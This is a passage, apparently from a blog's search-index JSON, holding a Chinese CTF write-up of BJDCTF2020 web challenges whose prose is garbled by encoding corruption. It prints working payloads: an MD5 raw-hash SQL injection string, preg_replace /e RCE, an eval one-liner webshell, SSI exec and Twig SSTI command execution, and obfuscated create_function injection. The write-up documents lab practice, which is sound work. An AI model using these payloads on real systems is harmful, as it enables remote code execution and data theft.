·ï¼Œä¸çŸ¥é“æœ‰å•¥æ„ä¹‰ã€‚ã€‚ã€‚è¿·\n","date":"2021-01-24T17:01:00+08:00","permalink":"https://k1te.cn/p/2021%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF/","title":"2021å¤§å‰å¤§åˆ©æ¯"},{"content":"BJDCTF2020 wp åœ¨buuojä¸Šé¢å¤ç°çš„wpï¼Œæœ‰ä¸€äº›æ˜¯è‡ªå·±åšå‡ºæ¥çš„ï¼Œæœ‰ä¸€äº›æ˜¯çœ‹äº†wpæ‰åšå‡ºæ¥äº†ï¼Œä¾ç„¶å¾ˆèœã€‚\nEasy MD5 æ‰“å¼€ç½‘å€ä¹‹åï¼Œåœ¨å“åº”æ ‡å¤´ä¸­æ‰¾åˆ°äº†hintï¼š\n1 select * from \u0026#39;admin\u0026#39; where password = md5($pass,true) ç†è®ºä¸Šmd5çš„å¯†ç éªŒè¯æ˜¯å¾ˆéš¾ç ´è§£çš„ï¼Œä½†æ˜¯è¿™é‡ŒMD5å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°è®¾ä¸ºtrueå°±æœ‰æ¼æ´ã€‚\n1 2 3 4 md5(\u0026#34;hello\u0026#34;); \u0026gt;\u0026gt;5d41402abc4b2a76b9719d911017c592 md5(\u0026#34;hello\u0026#34;,true); \u0026gt;\u0026gt;]A@*ï¿½K*vï¿½qï¿½ï¿½\u0010\u0017Å’ 32å­—ç¬¦åå…­è¿›åˆ¶æ•°å¾ˆå¥½ç†è§£ï¼Œ16è¿›åˆ¶å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼å¹¶éçœŸçš„äºŒè¿›åˆ¶ï¼ŒäºŒåå°†åå…­è¿›åˆ¶æ•°ä¸¤ä¸ªä¸€ç»„ï¼Œè½¬åŒ–æˆASCIIå­—ç¬¦ï¼Œå¦‚ï¼Œ5d =ã€‹],41=\u0026gt;A\nå› æ­¤å¯ä»¥è¾“å…¥ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œä½¿å¾—md5ä¹‹åçš„raw_outputä¸­å«æœ‰orã€‚ç½‘ä¸Šæ‰¾åˆ°äº†ä¸¤ä¸ªï¼š\n1 2 3 4 5 md5(\u0026#34;ffifdyop\u0026#34;,true); \u0026gt;\u0026gt;\u0026#39;or\u0026#39;6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b\u001c md5(\u0026#34;129581926211651571912466741651878684928\u0026#34;,true); \u0026gt;\u0026gt;\u0006ï¿½T0Dï¿½ï¿½o#ï¿½ï¿½\u0026#39;or\u0026#39;8 //ç¬¬äºŒä¸ªåœ¨è¯¥é¢˜ä¸­æ— æ•ˆ ç¬¬äºŒå±‚æ˜¯MD5ç¢°æ’ï¼š\n1 2 3 4 5 6 7 \u0026lt;!-- $a = $GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend. --\u0026gt; å› ä¸ºä½¿ç”¨çš„æ˜¯!=å’Œ==å¼±ç±»å‹æ¯”è¾ƒè€Œä¸æ˜¯ï¼==å’Œ===è¿™ç§å¼ºç±»å‹æ¯”è¾ƒï¼Œå¼±ç±»å‹æ¯”è¾ƒä¼šå°†â€˜0Eâ€™å¼€å¤´çš„å“ˆå¸Œå€¼è§£é‡Šä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚\nç¬¦åˆæ¡ä»¶çš„ä¸€äº›MD5å€¼ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 çº¯æ•°å­—ç±»ï¼š s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 å¤§å†™å­—æ¯ç±»ï¼š QLTHNDT 0e405967825401955372549139051580 QNKCDZO 0e830400451993494058024219903391 EEIZDOI 0e782601363539291779881938479162 TUFEPMC 0e839407194569345277863905212547 UTIPEZQ 0e382098788231234954670291303879 UYXFLOI 0e552539585246568817348686838809 IHKFRNS 0e256160682445802696926137988570 PJNPDWY 0e291529052894702774557631701704 ABJIHVY 0e755264355178451322893275696586 DQWRASX 0e742373665639232907775599582643 DYAXWCA 0e424759758842488633464374063001 GEGHBXL 0e248776895502908863709684713578 GGHMVOE 0e362766013028313274586933780773 GZECLQZ 0e537612333747236407713628225676 NWWKITQ 0e763082070976038347657360817689 NOOPCJF 0e818888003657176127862245791911 MAUXXQC 0e478478466848439040434801845361 MMHUWUV 0e701732711630150438129209816536 ç„¶åæ˜¯ç¬¬ä¸‰å±‚ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;?php error_reporting(0); include \u0026#34;flag.php\u0026#34;; highlight_file(__FILE__); if($_POST[\u0026#39;param1\u0026#39;]!==$_POST[\u0026#39;param2\u0026#39;]\u0026amp;\u0026amp;md5($_POST[\u0026#39;param1\u0026#39;])===md5($_POST[\u0026#39;param2\u0026#39;])){ echo $flag; } ç¬¬ä¸‰å±‚å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œç”±äºï¼š\n1 2 3 $a[] = 1; echo md5($a) === null; \u0026gt;\u0026gt;1 æ•…ï¼š\nMark loves cat è¿™é“é¢˜çœ‹äº†å¾ˆä¹…ï¼Œåˆšçœ‹åˆ°messageä»¥åŠgetçš„æ—¶å€™è§‰å¾—æ˜¯xssï¼Œä½†æ˜¯æä¸å®šï¼Œç„¶åå»çœ‹wpï¼Œå‘ç°æ˜¯gitæºç æ³„éœ²ï¼Œç„¶è€Œbuuçš„webç”¨dirsearchæ‰«æçš„æ—¶å€™æ°¸è¿œæ˜¯429-Too Many Requests\u0026hellip;\u0026hellip;.\nçŸ¥é“æ˜¯gitæºç æ³„éœ²ä¹‹åç”¨githackä¸‹è½½ï¼š\nindex.php:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; $yds = \u0026#34;dog\u0026#34;; $is = \u0026#34;cat\u0026#34;; $handsome = \u0026#39;yds\u0026#39;; foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } foreach($_GET as $x =\u0026gt; $y){ if($_GET[\u0026#39;flag\u0026#39;] === $x \u0026amp;\u0026amp; $x !== \u0026#39;flag\u0026#39;){ exit($handsome); } } if(!isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; !isset($_POST[\u0026#39;flag\u0026#39;])){ exit($yds); } if($_POST[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39; || $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;){ exit($is); } echo \u0026#34;the flag is: \u0026#34;.$flag; è¿™ä¸ªå¯å˜å˜é‡æŠŠæˆ‘ç»™ç»•æ™•äº†ã€‚ã€‚ã€‚å¯ä»¥çœ‹çœ‹L\u0026rsquo;Amoreå¤§ä½¬çš„wp\nZJCTFï¼Œä¸è¿‡å¦‚æ­¤ çœ‹äº†çœ‹é¢˜ç›®ï¼Œåº”è¯¥æ˜¯zjctfæŸé“é¢˜çš„æ”¹ç¼–ï¼Œé¦–å…ˆæ‰¾åˆ°zjctfçš„é¢˜ç›®ã€‚\nç¬¬ä¸€å±‚æ˜¯ä¸€æ ·çš„ï¼Œä½¿ç”¨data://ç»•è¿‡ã€‚payloadï¼š\n?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=\næ¥ç€çœ‹åˆ°includeå‡½æ•°æƒ³åˆ°æ–‡ä»¶åŒ…å«ã€‚\npayloadï¼š?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=\u0026amp;file=php://filter/read=convert.base64-encode/resource=next.php\nå°†base64è§£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;id\u0026#39;] = $id; function complex($re, $str) { return preg_replace( \u0026#39;/(\u0026#39; . $re . \u0026#39;)/ei\u0026#39;, \u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $str ); } foreach($_GET as $re =\u0026gt; $str) { echo complex($re, $str). \u0026#34;\\n\u0026#34;; } function getFlag(){ @eval($_GET[\u0026#39;cmd\u0026#39;]); } åˆšå¼€å§‹å‘ç°getFlagå‡½æ•°å®šä¹‰äº†æ²¡æœ‰æ‰§è¡Œï¼ŒçŒœæµ‹æ˜¯ä½¿ç”¨complexå‡½æ•°æ¥æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯çœ‹äº†å¥½ä¹…è¿˜æ˜¯æ²¡æ€è·¯ã€‚ã€‚ã€‚\nç„¶åçœ‹äº†wpæ‰çŸ¥é“preg_replaceåœ¨/eæ¨¡å¼ä¸‹çš„RCE\næ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ\npayloadï¼š?\\S*=${getflag()}\u0026amp;cmd=system('cat /flag');\nå½“ç„¶ï¼Œéƒ½RCEäº†ï¼Œä¹Ÿå¯ä»¥ä¸€å¥è¯æœ¨é©¬ç›´æ¥ä¸Šèšå‰‘\n?\\S*=${eval($_POST[kite])}\nEasySearch çœ‹åˆ°é¢˜ç›®çš„searchæƒ³åˆ°æºç æ³„éœ²ï¼Œè®¿é—®index.php.swpå¾—åˆ°éƒ¨åˆ†æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;?php ob_start();\tfunction get_hash(){ $chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^\u0026amp;*()+-\u0026#39;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); *** if(isset($_POST[\u0026#39;username\u0026#39;]) and $_POST[\u0026#39;username\u0026#39;] != \u0026#39;\u0026#39; ) { $admin = \u0026#39;6d0bc1\u0026#39;; if ( $admin == substr(md5($_POST[\u0026#39;password\u0026#39;]),0,6)) { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[+] Welcome to manage system\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; $file_shtml = \u0026#34;public/\u0026#34;.get_hash().\u0026#34;.shtml\u0026#34;; $shtml = fopen($file_shtml, \u0026#34;w\u0026#34;) or die(\u0026#34;Unable to open file!\u0026#34;); $text = \u0026#39; *** *** \u0026lt;h1\u0026gt;Hello,\u0026#39;.$_POST[\u0026#39;username\u0026#39;].\u0026#39;\u0026lt;/h1\u0026gt; *** ***\u0026#39;; fwrite($shtml,$text); fclose($shtml); *** echo \u0026#34;[!] Header error ...\u0026#34;; } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[!] Failed\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; }else { *** } *** ?\u0026gt; ç¬¬ä¸€å±‚ç›´æ¥çˆ†ç ´ï¼š\nè‡ªå·±å†™çš„åƒåœ¾è„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;?php for($i = 0;$i \u0026lt; 9999999999; $i++){ if (substr(md5($i),0,6) == \u0026#34;6d0bc1\u0026#34;) { echo \u0026#34;yes\u0026#34;.\u0026#34;\\n\u0026#34;.$i; return; } if ($i%1000000 == 0) echo \u0026#34;***\u0026#34;.\u0026#34;\\n\u0026#34;; } ç™»é™†æˆåŠŸ:\nåœ¨å“åº”æ ‡å¤´é‡Œæ‰¾åˆ°éšæœºç”Ÿæˆçš„urlï¼š\næ‰“å¼€ï¼š\nç„¶åæ˜¯ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼šApache å¼€å¯SSIé…ç½®ä½¿shtmlæ”¯æŒ include()å’ŒSSI Shellæ¼æ´é—®é¢˜\næœ¬é¢˜ä¸­æ²¡æœ‰è¿‡æ»¤ï¼Œç›´æ¥åœ¨usernameé‡Œæ‰“å°±å¯ä»¥äº†ï¼š\n\u0026lt;!--#exec cmd=\u0026quot;ls ../\u0026quot;--\u0026gt;\n\u0026lt;!--#exec cmd=\u0026quot;cat ../flag_990c66bf85a09c664f0b6741840499b2\u0026quot;--\u0026gt;\nCookie is so stable è€å›¾äº†ï¼š\nä¾æ¬¡æµ‹è¯•ï¼š ${7*7}ï¼Œè¿”å›${7*7}ï¼Œä¸é€šè¿‡ï¼›æµ‹è¯•{{7*7}}ï¼Œè¿”å›49ï¼Œé€šè¿‡ï¼›æµ‹è¯• {{7*'7'}}ï¼Œè¿”å›49,åˆ¤æ–­æ¨¡æ¿ä¸ºtwig(å¦‚æœæ˜¯jinja2è¿”å›7777777ï¼Œå¹¶ä¸”twigæ˜¯phpï¼Œjinjaæ˜¯python)\nçŸ¥è¯†ç‚¹é“¾æ¥ï¼šä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹SSTIæ¼æ´/#2-Twig\nhint:\næ ¹æ®æ–‡ç« å¾—åˆ°payloadï¼š\n1 {{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;cat /flag\u0026#34;)}} å¾—åˆ°flagï¼š\nEzPHP ezä¸ä¸€å®šezï¼Œä½†æ˜¯hardæ˜¯çœŸçš„hard\nhintï¼š\nbase32è§£ç ï¼š\nå¾—åˆ°æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $file = \u0026#34;1nD3x.php\u0026#34;; $shana = $_GET[\u0026#39;shana\u0026#39;]; $passwd = $_GET[\u0026#39;passwd\u0026#39;]; $arg = \u0026#39;\u0026#39;; $code = \u0026#39;\u0026#39;; echo \u0026#34;\u0026lt;br /\u0026gt;\u0026lt;font color=red\u0026gt;\u0026lt;B\u0026gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!\u0026lt;/B\u0026gt;\u0026lt;br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; if($_SERVER) { if ( preg_match(\u0026#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\u0026#34;|\\\u0026#39;|log/i\u0026#39;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) ) die(\u0026#39;You seem to want to do something bad?\u0026#39;); } if (!preg_match(\u0026#39;/http|https/i\u0026#39;, $_GET[\u0026#39;file\u0026#39;])) { if (preg_match(\u0026#39;/^aqua_is_cute$/\u0026#39;, $_GET[\u0026#39;debu\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;debu\u0026#39;] !== \u0026#39;aqua_is_cute\u0026#39;) { $file = $_GET[\u0026#34;file\u0026#34;]; echo \u0026#34;Neeeeee! Good Job!\u0026lt;br\u0026gt;\u0026#34;; } } else die(\u0026#39;fxck you! What do you want to do ?!\u0026#39;); if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match(\u0026#39;/[a-zA-Z]/i\u0026#39;, $value)) die(\u0026#39;fxck you! I hate English!\u0026#39;); } } if (file_get_contents($file) !== \u0026#39;debu_debu_aqua\u0026#39;) die(\u0026#34;Aqua is the cutest five-year-old child in the world! Isn\u0026#39;t it ?\u0026lt;br\u0026gt;\u0026#34;); if ( sha1($shana) === sha1($passwd) \u0026amp;\u0026amp; $shana != $passwd ){ extract($_GET[\u0026#34;flag\u0026#34;]); echo \u0026#34;Very good! you know my password. But what is flag?\u0026lt;br\u0026gt;\u0026#34;; } else{ die(\u0026#34;fxck you! you don\u0026#39;t know my password! And you don\u0026#39;t know sha1! why you come here!\u0026#34;); } if(preg_match(\u0026#39;/^[a-z0-9]*$/isD\u0026#39;, $code) || preg_match(\u0026#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\\u0026amp;|\\$|\\*|\\||\\\u0026lt;|\\\u0026#34;|\\\u0026#39;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i\u0026#39;, $arg) ) { die(\u0026#34;\u0026lt;br /\u0026gt;Neeeeee~! I have disabled all dangerous functions! You can\u0026#39;t get my flag =w=\u0026#34;); } else { include \u0026#34;flag.php\u0026#34;; $code(\u0026#39;\u0026#39;, $arg); } ?\u0026gt; å…ˆçœ‹ä¸€ä¸‹ç¬¬ä¸€å±‚è¿‡æ»¤ï¼šæœ‰å…³$_SERVERçš„çŸ¥è¯†\næ‰€ä»¥æœ¬é¢˜ä¸­$_SERVER[\u0026lsquo;QUERY_STRING\u0026rsquo;]è¿‡æ»¤çš„æ˜¯getçš„å‚æ•°ï¼Œç›´æ¥ç”¨urlç¼–ç ç»•è¿‡å³å¯ï¼Œæœ‰ä¸€ä¸ªå°å‘å°±æ˜¯ï¼šä¸€èˆ¬ç½‘ä¸Šçš„åœ¨çº¿urlç¼–ç /è§£ç ä¸ä¼šå¯¹å­—æ¯æ•°å­—è¿›è¡Œç¼–ç ï¼Œå› ä¸ºï¼š\n\u0026ldquo;\u0026hellip;Only alphanumerics [0-9a-zA-Z], the special characters \u0026ldquo;$-.+!*\u0026rsquo;(),\u0026rdquo; [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL.\u0026rdquo;\n\u0026ldquo;åªæœ‰å­—æ¯å’Œæ•°å­—[0-9a-zA-Z]ã€ä¸€äº›ç‰¹æ®Šç¬¦å·\u0026rdquo;$-_.+!*\u0026rsquo;(),\u0026quot;[ä¸åŒ…æ‹¬åŒå¼•å·]ã€ä»¥åŠæŸäº›ä¿ç•™å­—ï¼Œæ‰å¯ä»¥ä¸ç»è¿‡ç¼–ç ç›´æ¥ç”¨äºURLã€‚\u0026quot;\nä¸€èˆ¬æ¥è¯´è¿™äº›å­—ç¬¦çš„urlç¼–ç å°±æ˜¯asciiç å‰é¢åŠ ä¸ª%,å…·ä½“å‚è€ƒï¼šhttps://www.w3school.com.cn/tags/html_ref_urlencode.htm\nç¬¬äºŒå±‚è¿‡æ»¤åˆè¦åœ¨debuä¸­æ­£åˆ™åŒ¹é…åˆ°\u0026quot;aqua_is_cute\u0026quot;å¹¶ä¸”ç”¨^å’Œ$å¡ä½äº†ä¸¤ç«¯ï¼Œåˆè¦æ±‚debu !== \u0026ldquo;aqua_is_cute\u0026rdquo; ï¼Œçœ‹ä¼¼ä¸å¯èƒ½ï¼Œä½†æ˜¯ç»“å°¾æ²¡æœ‰/Dçš„è¯ï¼Œ$ä¼šçœç•¥å¥å°¾çš„%0aã€‚æ‰€ä»¥åªéœ€è¦ä¼ å…¥\n1 debu=aqua_is_cute%0a å†urlç¼–ç ä¸€ä¸‹ï¼š\n1 %64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a ç¬¬ä¸‰å±‚è¿‡æ»¤æ˜¯çœ‹çœ‹$_REQUESTä¸­æœ‰æ²¡æœ‰è‹±æ–‡å­—æ¯ï¼Œå³ä½¿æ˜¯urlç¼–ç ï¼Œå› ä¸ºæ˜¯16è¿›åˆ¶ï¼Œæ‰€ä»¥ä¾ç„¶ä¼šæœ‰è‹±æ–‡å­—æ¯çš„å‡ºç°ï¼Œè¿™é‡Œæ¶‰åŠåˆ°$_REQUESTçš„ä¸€ä¸ªç‰¹æ€§(bug)ï¼šå½“GETå’ŒPOSTéƒ½å­˜åœ¨åŒä¸€ä¸ªå˜é‡åçš„æ—¶å€™ï¼Œåªè·å–POSTä¸­çš„å€¼ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªç‰¹æ€§æ¥ç»•è¿‡æ­£åˆ™çš„åŒ¹é…ã€‚å¦‚å›¾ï¼š\nç¬¬å››å±‚ï¼šif (file_get_contents($file) !== 'debu_debu_aqua')å°±æ˜¯è¦åœ¨$fileä¸­å†™å…¥â€œdebu_debu_aquaâ€ï¼Œå¯ä»¥ç”¨php://inputæˆ–è€…data://text/plain,(urlç¼–å†™å†…å®¹)ç»•è¿‡ï¼Œå‚è€ƒï¼šPHP file_get_contents ç»•è¿‡\nç¬¬äº”å±‚ï¼šPHP ä¸­çš„sha1()å’ŒMD5()å‡½æ•°æ¼æ´\nå½“ä¼ å…¥?shana[]\u0026amp;passwd[]=123æ—¶ï¼Œä»–ä¿©çš„sha1éƒ½ä¸ºnullï¼Œä½†æ˜¯ä¸¤è€…ä¸ç›¸ç­‰ã€‚\nç¬¬å…­å±‚ï¼Œä¹Ÿæ˜¯æœ€åä¸€å±‚äº†ã€‚\nå‚è€ƒï¼šä»£ç å®¡è®¡ä»å…¥é—¨åˆ°æ”¾å¼ƒ(ä¸€) \u0026amp; function\nä»å‚è€ƒæ–‡ç« å¯çŸ¥ï¼Œ\u0026amp;5cå³\\æ‰“å¤´æ—¶å¯ä»¥æ­£å¸¸è¿è¡Œvar_dump()ï¼Œä½†æ˜¯ã€‚ã€‚ã€‚æœ¬é¢˜ä¸­å˜é‡codeå’Œargæ²¡åŠæ³•getã€‚ã€‚ã€‚\nç„¶åæˆ‘å‘ç°åœ¨sha1è¿‡æ»¤çš„åœ°æ–¹ä¼šæ‰§è¡Œä¸€ä¸ªextractå‡½æ•°ï¼ˆåˆšå¼€å§‹è¿˜æ²¡çœ‹è§ï¼Œæ‰¾äº†å¥½ä¹…ã€‚ã€‚ã€‚ï¼‰è¿™æ˜¯ä¸€ä¸ªç»å…¸çš„å˜é‡è¦†ç›–çš„é—®é¢˜ã€‚\nä¸è¿‡ä¹Ÿæœ‰ä¸ªå°å‘ï¼Œå°±æ˜¯åˆšå¼€å§‹ä¸çŸ¥é“å¦‚ä½•å˜é‡è¦†ç›–ï¼Œç½‘ä¸Šçš„èµ„æ–™åŸºæœ¬éƒ½æ˜¯extract($_GET); ï¼Œç›´æ¥ä¼ å…¥code=xxx\u0026amp;arg=xxxå³å¯ï¼›è¿™é‡Œçš„extract($_GET[\u0026quot;flag\u0026quot;]); éœ€è¦ä¼ å…¥flag[code]=xxx\u0026amp;flag[arg]=xxx\nè¾“å…¥flag[code]=%5cvar_dump\u0026amp;flag[arg]=23333ï¼ˆurlç¼–ç ä¹‹åä¸ºï¼š%66%6c%61%67%5b%63%6f%64%65%5d=%5c%76%61%72%5f%64%75%6d%70\u0026amp;%66%6c%61%67%5b%61%72%67%5d=2333ï¼‰è¿›è¡Œæµ‹è¯•:\nçåæ¹ªæ©æ¬“å™·é”›å±¼ç¶˜é‘³èŠ¥å¬é’æ¿ç• éšæ¥‹ç´µ\nF12ï¼š\nåˆ°è¿™é‡Œæ€è·¯å°±æ–­äº†ï¼Œä»¥ä¸ºè¿™äº›ç”Ÿåƒ»å­—æ˜¯flagï¼Œä½†æ˜¯çœ‹äº†wpä¹‹åæ‰å‘ç°ä¸æ˜¯ã€‚åœ¨$code('', $arg);å¤„æ²¡æœ‰æ‰§è¡Œä»»ä½•æŒ‡ä»¤ï¼Œæˆ‘è¿˜ä»¥ä¸ºè¢«bançš„å‡½æ•°è¿™ä¹ˆå¤šï¼Œä¸éœ€è¦ç»•è¿‡ï¼Œä»¥åŠincludeäº†flag.phpï¼Œä»¥åŠå‡ºç°äº†flagå­—æ ·ï¼Œå¯¼è‡´æˆ‘ä»¥ä¸ºflagå‡ºäº†ï¼Œåé¢æ˜¯ä¸ªmiscã€‚\né¡ºç€wpçš„æ€è·¯å¾€ä¸‹ï¼šå› ä¸ºincludeäº†flag.phpï¼Œæ‰€ä»¥å¯ä»¥ç”¨get_defined_vars()å°†æ‰€æœ‰å˜é‡dumpå‡ºæ¥\næœ¬æ¥æƒ³è¯•è¯•èƒ½ä¸èƒ½ä¸åˆ©ç”¨create_functionç›´æ¥dumpï¼Œåé¢å‘ç°ä¸è¡Œï¼š\nå› ä¸ºæ­¤æ—¶æ‰§è¡Œçš„æ˜¯var_dump('','get_defined_vars()')ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—åˆ©ç”¨create_functionï¼ŒåŸç†è§£æï¼š[ç§‘æ™®å‘] è§£æcreate_function() \u0026amp;\u0026amp; å¤ç°wp\næ„é€ payloadï¼š\n1 2 flag[code]=create_function\u0026amp;flag[arg]=}var_dump(get_defined_vars());// urlç¼–ç ä¹‹åä¸ºï¼š%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e\u0026amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f ï¼ˆåˆšå¼€å§‹ä»¥ä¸ºè¿‡æ»¤äº†},ä½†æ˜¯ä»”ç»†çœ‹çœ‹å‘ç°åªè¿‡æ»¤äº†{ã€‚ã€‚ã€‚ä»¥åŠï¼Œä¸ºä»€ä¹ˆcodeä¸éœ€è¦%5cï¼‰\nå°†æ‰€æœ‰å˜é‡dumpå‡ºæ¥ä¹‹åå‘ç°æç¤ºçœŸæ­£çš„flagåœ¨rea1fl4g.php\nå› ä¸ºè¿‡æ»¤äº†includeï¼Œæ‰€ä»¥å¯ä»¥ç”¨requireä»£æ›¿includeï¼Œå°†rea1fl4g.phpåŒ…å«è¿›æ¥ï¼Œå¹¶ä¸”è¿‡æ»¤äº†Â·ï¼Œå¯ä»¥ç”¨base64ç»•è¿‡\npayloadï¼š\n1 2 3 4 flag[code]=create_function\u0026amp;flag[arg]=}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());// cmVhMWZsNGcucGhw:rea1fl4g.phpçš„base64ç¼–ç  urlç¼–ç ä¹‹åä¸ºï¼š %66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e\u0026amp;%66%6c%61%67%5b%61%72%67%5d=%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f ç„¶åå¾—åˆ°äº†ä¸€ä¸ªå‡çš„flagï¼šï¼ˆè„¸ä¸Šç¬‘å˜»å˜»\næ ¹æ®wpï¼Œé¢„æœŸè§£æ˜¯å–åç»•è¿‡ï¼š\npayloadï¼š\n1 flag[code]=create_function\u0026amp;flag[arg]=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));// æœ€åç»ˆäºæ‹¿åˆ°flagï¼š\nThe mystery of ip 